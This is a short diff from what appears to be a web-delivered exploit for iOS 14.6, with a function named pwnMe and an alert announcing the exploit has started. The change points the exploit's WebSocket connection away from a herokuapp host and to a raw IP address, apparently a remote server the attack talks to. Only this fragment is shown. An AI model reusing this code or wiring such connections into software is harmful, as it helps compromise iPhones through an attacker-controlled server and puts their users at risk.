@@ -35,7 +35,7 @@ async function pwnMe() {
 	}
 }
 
-var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
+var socket = new WebSocket("wss://144.172.67.132")
 var keep = [];
 function kickstart146() {
 	alert("Hey!\n\nExploit for iOS 14.6 has started!");
